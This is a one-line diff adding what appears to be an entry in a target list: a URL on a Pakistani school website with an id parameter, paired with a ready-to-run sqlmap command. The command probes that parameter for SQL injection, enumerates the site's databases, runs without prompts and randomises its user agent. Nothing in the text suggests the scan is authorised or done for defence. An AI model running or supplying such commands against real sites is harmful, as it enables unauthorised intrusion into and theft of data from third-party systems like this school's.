@@ -1,0 +1,1 @@
+https://www.educators.edu.pk/news-events-detail?id=19 (GET)  # /usr/bin/sqlmap -u https://www.educators.edu.pk/news-events-detail?id=19 --dbs --batch --random-agent
